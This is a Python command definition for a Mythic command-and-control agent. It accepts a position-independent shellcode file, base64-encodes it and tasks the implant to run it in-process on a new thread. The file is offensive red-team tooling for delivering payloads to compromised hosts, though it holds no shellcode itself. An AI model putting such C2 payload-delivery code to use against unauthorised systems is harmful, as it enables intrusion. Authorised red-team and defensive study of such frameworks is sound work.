from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ExecutePicArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="PIC shellcode file to execute (raw PIC or Crystal Palace output)",
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class ExecutePicCommand(CommandBase):
    cmd = "execute_pic"
    needs_admin = False
    help_cmd = "execute_pic -file <shellcode>"
    description = "Execute a Crystal Palace PIC payload in the current process via a new thread."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1106"]
    argument_class = ExecutePicArguments
    attributes = CommandAttributes(
        builtin=False
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        file_id = taskData.args.get_arg("file")
        file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))

        if not file_resp.Success:
            response.Success = False
            response.Error = f"Failed to get file content: {file_resp.Error}"
            return response

        import base64
        taskData.args.add_arg("pic_data", base64.b64encode(file_resp.Content).decode(), ParameterType.String)
        taskData.args.remove_arg("file")

        sc_len = len(file_resp.Content)
        response.DisplayParams = f"{sc_len} bytes"

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
